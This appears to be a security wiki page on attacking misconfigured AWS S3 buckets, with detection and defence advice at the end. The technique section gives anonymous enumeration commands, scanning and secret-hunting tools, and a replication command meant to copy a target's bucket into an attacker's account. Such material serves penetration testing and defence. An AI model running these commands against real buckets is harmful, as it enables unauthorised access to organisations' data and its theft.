---
title: S3 attacks
slug: aws-s3-attacks
---

> **TL;DR:** Public buckets and stale ACLs leak data; bucket-policy gaps allow cross-account writes; replication and presigned URLs leak credentials and content out of the org boundary.

## What it is
S3 ships with too many overlapping access mechanisms — bucket ACLs, bucket policies, object ACLs, IAM policies, Access Points, Block Public Access at three scopes, and presigned URLs. Drift between them is the usual root cause: a "Block Public Access" toggle disabled for one bucket, an object ACL set to `public-read` on upload, or a bucket policy that allows `s3:PutObject` from `Principal: "*"` with no condition. On top of that, replication rules, presigned URLs and confused-deputy patterns (bucket policy trusting any account, IAM trusting any bucket) turn an apparently scoped bucket into an exfil channel.

## Preconditions / where it applies
- Any S3 bucket reachable from your network (public ones obviously, but VPC-only ones from inside a compromised VPC too).
- For attacker-side: AWS creds with `s3:GetObject`, `s3:PutObject`, or `s3:GetBucketAcl` on a target.
- For takeover/squatting: bucket name freed but still referenced by CloudFront / docs / scripts.

## Technique
1. Discover buckets — DNS prefixes, code references, CloudFront origins, `s3:ListAllMyBuckets` if authenticated.
2. Probe access modes: anonymous GET, anonymous LIST, authenticated cross-account.
3. Look for write primitives: open `PutObject`, replication into your account, presigned URLs.

```bash
# Anonymous enumeration
curl -sI https://target-bucket.s3.amazonaws.com/
aws s3 ls s3://target-bucket --no-sign-request
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request
```

```bash
# Tooling
s3scanner scan --bucket target-bucket
trufflehog s3 --bucket target-bucket            # secret hunt
cloud_enum -k corp                              # name discovery
```

```bash
# Replication confused-deputy: convince target to replicate into attacker bucket
aws s3api put-bucket-replication --bucket target-bucket \
  --replication-configuration file://repl.json
# (requires misconfig where attacker has PutBucketReplication on the target)
```

Other recurring patterns: subdomain takeover by claiming a freed bucket; `s3:GetObject` allowed but `s3:ListBucket` denied, forcing object-name guessing (often gameable via predictable IDs); presigned URL leakage from CI logs.

## Detection and defence
- Enforce Block Public Access at account level; enforce `BucketOwnerEnforced` to retire object ACLs.
- Bucket policies should pin `aws:SourceAccount` / `aws:SourceArn` / `aws:PrincipalOrgID` conditions.
- IAM Access Analyzer for S3, plus CloudTrail data events on sensitive buckets — alert on `GetObject` from outside the org or unusual user-agents.
- Related: [[aws-iam-enum]], [[ssrf]].

## References
- [HackingTheCloud — S3 enumeration & exploitation](https://hackingthe.cloud/aws/enumeration/s3/) — practical recipes and tools.
- [AWS — Block Public Access](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html) — vendor reference for the BPA settings most often misconfigured.
